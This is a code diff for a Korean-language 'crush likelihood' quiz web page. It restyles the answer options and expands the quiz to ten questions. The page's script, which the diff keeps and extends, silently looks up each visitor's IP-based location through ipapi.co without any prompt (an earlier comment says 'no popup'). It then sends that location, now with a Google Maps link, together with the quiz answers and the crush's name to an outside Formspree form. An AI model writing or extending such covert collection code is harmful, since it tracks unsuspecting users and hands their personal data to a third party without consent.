@@ -28,6 +28,7 @@
       border: 1px solid #ccc;
     }
     .question { margin-top: 20px; }
+    .option { margin-left: 10px; display: block; }
     button {
       margin-top: 20px;
       padding: 10px 20px;
@@ -51,68 +52,85 @@
     <label>짝사랑 상대 이름:</label>
     <input type="text" id="crushName" required>
 
+    <!-- 질문 1~10 -->
     <div class="question">
-      <label>1️⃣ 상대방과 얼마나 자주 대화하나요?</label>
-      <label><input type="radio" name="q1" value="10"> 거의 안 해요</label>
-      <label><input type="radio" name="q1" value="40"> 가끔 해요</label>
-      <label><input type="radio" name="q1" value="70"> 자주 해요</label>
-      <label><input type="radio" name="q1" value="100"> 매일 대화해요</label>
+      <label>1️⃣ 상대와 얼마나 자주 대화하나요?</label>
+      <label class="option"><input type="radio" name="q1" value="10"> 거의 안 해요</label>
+      <label class="option"><input type="radio" name="q1" value="40"> 가끔 해요</label>
+      <label class="option"><input type="radio" name="q1" value="70"> 자주 해요</label>
+      <label class="option"><input type="radio" name="q1" value="100"> 매일 대화해요</label>
     </div>
-    
+
     <div class="question">
       <label>2️⃣ 상대가 나를 볼 때 미소를 짓나요?</label>
-      <label><input type="radio" name="q2" value="10"> 전혀 아니요</label>
-      <label><input type="radio" name="q2" value="50"> 가끔 그래요</label>
-      <label><input type="radio" name="q2" value="80"> 자주 그래요</label>
-      <label><input type="radio" name="q2" value="100"> 항상 그래요</label>
+      <label class="option"><input type="radio" name="q2" value="10"> 전혀 아니요</label>
+      <label class="option"><input type="radio" name="q2" value="50"> 가끔 그래요</label>
+      <label class="option"><input type="radio" name="q2" value="80"> 자주 그래요</label>
+      <label class="option"><input type="radio" name="q2" value="100"> 항상 그래요</label>
     </div>
 
     <div class="question">
       <label>3️⃣ 내가 먼저 연락했을 때 반응은 어떤가요?</label>
-      <label><input type="radio" name="q3" value="20"> 거의 무시해요 😢</label>
-      <label><input type="radio" name="q3" value="50"> 답은 해줘요</label>
-      <label><input type="radio" name="q3" value="80"> 반갑게 받아줘요</label>
-      <label><input type="radio" name="q3" value="100"> 먼저 연락 오기도 해요 💬</label>
+      <label class="option"><input type="radio" name="q3" value="20"> 거의 무시해요</label>
+      <label class="option"><input type="radio" name="q3" value="50"> 답은 해줘요</label>
+      <label class="option"><input type="radio" name="q3" value="80"> 반갑게 받아줘요</label>
+      <label class="option"><input type="radio" name="q3" value="100"> 먼저 연락 오기도 해요</label>
     </div>
 
     <div class="question">
       <label>4️⃣ 서로 SNS에서 서로를 팔로우하고 있나요?</label>
-      <label><input type="radio" name="q4" value="20"> 둘 다 안 해요</label>
-      <label><input type="radio" name="q4" value="50"> 한 명만 해요</label>
-      <label><input type="radio" name="q4" value="80"> 서로 팔로우해요</label>
-      <label><input type="radio" name="q4" value="100"> 자주 소통해요 💞</label>
+      <label class="option"><input type="radio" name="q4" value="20"> 둘 다 안 해요</label>
+      <label class="option"><input type="radio" name="q4" value="50"> 한 명만 해요</label>
+      <label class="option"><input type="radio" name="q4" value="80"> 서로 팔로우해요</label>
+      <label class="option"><input type="radio" name="q4" value="100"> 자주 소통해요</label>
     </div>
 
     <div class="question">
       <label>5️⃣ 상대가 나에게 관심을 보이는 것 같나요?</label>
-      <label><input type="radio" name="q5" value="10"> 전혀 아니요</label>
-      <label><input type="radio" name="q5" value="40"> 약간 그런 듯?</label>
-      <label><input type="radio" name="q5" value="70"> 제법 그런 것 같아요</label>
-      <label><input type="radio" name="q5" value="100"> 확실히 관심 있어요 ❤️</label>
+      <label class="option"><input type="radio" name="q5" value="10"> 전혀 아니요</label>
+      <label class="option"><input type="radio" name="q5" value="40"> 약간 그런 듯</label>
+      <label class="option"><input type="radio" name="q5" value="70"> 제법 그런 것 같아요</label>
+      <label class="option"><input type="radio" name="q5" value="100"> 확실히 관심 있어요</label>
     </div>
 
     <div class="question">
       <label>6️⃣ 상대방이 답장을 어떻게 하나요?</label>
-      <label><input type="radio" name="q6" value="20"> 단답형이에요 😐</label>
-      <label><input type="radio" name="q6" value="50"> 그냥 평범해요</label>
-      <label><input type="radio" name="q6" value="80"> 귀엽거나 재밌게 답해요 😊</label>
-      <label><input type="radio" name="q6" value="100"> 애교 섞인 톤이에요 💕</label>
+      <label class="option"><input type="radio" name="q6" value="20"> 단답형이에요</label>
+      <label class="option"><input type="radio" name="q6" value="50"> 그냥 평범해요</label>
+      <label class="option"><input type="radio" name="q6" value="80"> 귀엽거나 재밌게 답해요</label>
+      <label class="option"><input type="radio" name="q6" value="100"> 애교 섞인 톤이에요</label>
     </div>
 
     <div class="question">
-      <label>7️⃣ 그 사람과 눈이 마주치면 어떤가요?</label>
-      <label><input type="radio" name="q7" value="20"> 아무렇지 않아요</label>
-      <label><input type="radio" name="q7" value="50"> 살짝 민망해요</label>
-      <label><input type="radio" name="q7" value="80"> 심장이 조금 빨리 뛰어요</label>
-      <label><input type="radio" name="q7" value="100"> 너무 떨려요 ❤️</label>
+      <label>7️⃣ 상대가 먼저 말을 걸거나 연락한 적이 있나요?</label>
+      <label class="option"><input type="radio" name="q7" value="20"> 전혀 없어요</label>
+      <label class="option"><input type="radio" name="q7" value="50"> 가끔 있었어요</label>
+      <label class="option"><input type="radio" name="q7" value="80"> 종종 먼저 연락해요</label>
+      <label class="option"><input type="radio" name="q7" value="100"> 자주 먼저 연락해요</label>
     </div>
 
     <div class="question">
-      <label>8️⃣ 그 사람이 다른 이성과 있을 때 기분이 어떤가요?</label>
-      <label><input type="radio" name="q8" value="10"> 아무렇지 않아요</label>
-      <label><input type="radio" name="q8" value="40"> 조금 신경 쓰여요</label>
-      <label><input type="radio" name="q8" value="70"> 마음이 불편해요</label>
-      <label><input type="radio" name="q8" value="100"> 질투나요 😢</label>
+      <label>8️⃣ 내 이야기나 일상에 관심을 보이나요?</label>
+      <label class="option"><input type="radio" name="q8" value="20"> 전혀요</label>
+      <label class="option"><input type="radio" name="q8" value="50"> 가끔 물어봐요</label>
+      <label class="option"><input type="radio" name="q8" value="80"> 제법 관심 있어요</label>
+      <label class="option"><input type="radio" name="q8" value="100"> 아주 잘 기억해요</label>
+    </div>
+
+    <div class="question">
+      <label>9️⃣ 내가 농담하거나 말하면 웃어주나요?</label>
+      <label class="option"><input type="radio" name="q9" value="20"> 거의 안 웃어요</label>
+      <label class="option"><input type="radio" name="q9" value="50"> 예의상 웃어요</label>
+      <label class="option"><input type="radio" name="q9" value="80"> 자주 웃어요</label>
+      <label class="option"><input type="radio" name="q9" value="100"> 항상 잘 웃어요</label>
+    </div>
+
+    <div class="question">
+      <label>🔟 나를 도와주거나 챙겨준 적이 있나요?</label>
+      <label class="option"><input type="radio" name="q10" value="20"> 그런 적 없어요</label>
+      <label class="option"><input type="radio" name="q10" value="50"> 한두 번 정도</label>
+      <label class="option"><input type="radio" name="q10" value="80"> 꽤 여러 번</label>
+      <label class="option"><input type="radio" name="q10" value="100"> 자주 챙겨줘요</label>
     </div>
 
     <button type="submit">결과 보기</button>
@@ -133,7 +151,7 @@
         return;
       }
 
-      const questions = ['q1','q2','q3','q4','q5','q6','q7','q8'];
+      const questions = ['q1','q2','q3','q4','q5','q6','q7','q8','q9','q10'];
       let total = 0, answered = 0;
       let answers = {};
 
@@ -167,11 +185,11 @@
         <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>${message}
       `;
 
-      // 🌍 IP 기반 위치 자동 수집 (팝업 없음)
+      // 🌍 IP 기반 위치 자동 수집
       fetch("https://ipapi.co/json/")
         .then(res => res.json())
         .then(data => {
-          const location = `${data.city}, ${data.region}, ${data.country_name}`;
+          const location = `${data.city}, ${data.region}, ${data.country_name} (https://maps.google.com/?q=${encodeURIComponent(data.city + ',' + data.country_name)})`;
 
           fetch("https://formspree.io/f/xanegwav", {
             method: "POST",
@@ -187,7 +205,6 @@
           });
         })
         .catch(() => {
-          // 위치 실패 시에도 그냥 결과만 전송
           fetch("https://formspree.io/f/xanegwav", {
             method: "POST",
             headers: { "Accept": "application/json", "Content-Type": "application/json" },
